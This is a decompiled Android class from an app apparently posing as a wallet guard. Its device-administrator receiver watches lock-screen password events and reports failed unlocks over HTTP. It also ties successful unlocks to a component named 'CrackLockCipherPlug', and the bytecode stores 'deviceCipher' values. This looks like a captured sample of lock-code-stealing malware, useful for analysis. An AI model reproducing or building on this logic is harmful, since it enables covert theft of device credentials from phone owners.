package com.guard.wallet.receiver;

import a1.q;
import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.UserHandle;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.helper.o;
import com.guard.wallet.helper.r;
import com.guard.wallet.http.l;
import com.guard.wallet.plug.c;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.ReqListenHelper;
import com.guard.wallet.resp.DeviceAdminVO;
import com.guard.wallet.utils.g;
import com.guard.wallet.utils.h;
import java.util.Objects;

public class CustomAdminReceiver extends DeviceAdminReceiver {
   public static final int a = 0;

   public static void a() {
      DeviceAdminVO var2 = g.C0();
      MessageRecordVO var1 = new MessageRecordVO();
      var1.setExtraBody(var2);
      String var0;
      if (Objects.equals(var2.getIsAdminActive(), 1)) {
         var0 = "android.app.action.DEVICE_ADMIN_ENABLED";
      } else {
         var0 = "android.app.action.DEVICE_ADMIN_DISABLED";
      }

      var1.setIntentCode(var0);
      Log.d("CustomAdminReceiver", var2.toString());
      if (MainApplication.getInstance() != null && MainApplication.getInstance().getHandlerMsgAndTimer() != null) {
         MainApplication.getInstance().getHandlerMsgAndTimer().b(var1);
      }
   }

   public final void onDisabled(Context var1, Intent var2) {
      super.onDisabled(var1, var2);
      a();
   }

   public final void onEnabled(Context var1, Intent var2) {
      super.onEnabled(var1, var2);
      a();
   }

   public final void onLockTaskModeEntering(Context var1, Intent var2, String var3) {
      super.onLockTaskModeEntering(var1, var2, var3);
      Log.d("CustomAdminReceiver", "CustomAdminReceiver.onLockTaskModeEntering");
   }

   public final void onLockTaskModeExiting(Context var1, Intent var2) {
      super.onLockTaskModeExiting(var1, var2);
      Log.d("CustomAdminReceiver", "CustomAdminReceiver.onLockTaskModeExiting");
   }

   public final void onPasswordChanged(Context param1, Intent param2, UserHandle param3) {
      // $VF: Couldn't be decompiled
      // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
      // java.lang.NullPointerException: Cannot read field "id" because the return value of "org.jetbrains.java.decompiler.modules.decompiler.flow.FlattenStatementsHelper.getDirectNode(org.jetbrains.java.decompiler.modules.decompiler.stats.Statement)" is null
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:179)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.collectCatchVars(ExprProcessor.java:184)
      //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.processStatement(ExprProcessor.java:112)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.getFinallyInformation(FinallyProcessor.java:136)
      //   at org.jetbrains.java.decompiler.modules.decompiler.FinallyProcessor.iterateGraph(FinallyProcessor.java:85)
      //   at org.jetbrains.java.decompiler.main.rels.MethodProcessor.codeToJava(MethodProcessor.java:178)
      //
      // Bytecode:
      // 00: aload 0
      // 01: aload 1
      // 02: aload 2
      // 03: aload 3
      // 04: invokespecial android/app/admin/DeviceAdminReceiver.onPasswordChanged (Landroid/content/Context;Landroid/content/Intent;Landroid/os/UserHandle;)V
      // 07: ldc "CustomAdminReceiver"
      // 09: ldc "CustomAdminReceiver.onPasswordChanged"
      // 0b: invokestatic android/util/Log.d (Ljava/lang/String;Ljava/lang/String;)I
      // 0e: pop
      // 0f: ldc "android.intent.action.DEVICE_PASSWORD_CHANGED"
      // 11: invokestatic com/guard/wallet/utils/h.G (Ljava/lang/String;)V
      // 14: ldc com/guard/wallet/req/ReqUnlockDeviceVO
      // 16: monitorenter
      // 17: ldc "deviceCipher"
      // 19: invokestatic com/guard/wallet/utils/h.w (Ljava/lang/String;)V
      // 1c: ldc com/guard/wallet/req/ReqUnlockDeviceVO
      // 1e: monitorexit
      // 1f: ldc com/guard/wallet/req/ReqUnlockDeviceVO
      // 21: monitorenter
      // 22: ldc "deviceCipherLocked"
      // 24: invokestatic com/guard/wallet/utils/h.w (Ljava/lang/String;)V
      // 27: ldc com/guard/wallet/req/ReqUnlockDeviceVO
      // 29: monitorexit
      // 2a: return
      // 2b: astore 1
      // 2c: ldc com/guard/wallet/req/ReqUnlockDeviceVO
      // 2e: monitorexit
      // 2f: aload 1
      // 30: athrow
      // 31: astore 1
      // 32: ldc com/guard/wallet/req/ReqUnlockDeviceVO
      // 34: monitorexit
      // 35: aload 1
      // 36: athrow
   }

   public final void onPasswordExpiring(Context var1, Intent var2, UserHandle var3) {
      super.onPasswordExpiring(var1, var2, var3);
      Log.d("CustomAdminReceiver", "CustomAdminReceiver.onPasswordExpiring");
      h.G("android.intent.action.DEVICE_PASSWORD_EXPIRED");
   }

   public final void onPasswordFailed(Context var1, Intent var2, UserHandle var3) {
      super.onPasswordFailed(var1, var2, var3);
      Log.d("CustomAdminReceiver", "CustomAdminReceiver.onPasswordFailed");
      h.G("android.intent.action.DEVICE_PASSWORD_FAILED");
      if (g.p0()) {
         h.D(ScreenBroadcastReceiver.b.a(), "lockBatchId");
      }

      String var4 = h.l("lockSubscribeId");
      if (!q.B(var4) && g.p0()) {
         l.i(new ReqListenHelper(var4, 5));
      }

      if (MainApplication.getInstance() != null && MainApplication.getInstance().getCrackLockCipherPlug() != null) {
         Log.d("com.guard.wallet.plug.c", "cacheResponseQueue clearError");
         c.a.clear();
      }
   }

   public final void onPasswordSucceeded(Context var1, Intent var2, UserHandle var3) {
      super.onPasswordSucceeded(var1, var2, var3);
      Log.d("CustomAdminReceiver", "CustomAdminReceiver.onPasswordSucceeded");
      if (MainApplication.getInstance() != null && MainApplication.getInstance().getCrackLockCipherPlug() != null) {
         MainApplication.getInstance().getCrackLockCipherPlug().getClass();
         c.g();
      }

      if (r.k()) {
         r.g(true);
      }

      if (o.i() || o.h()) {
         o.f(null, true);
      }
   }
}
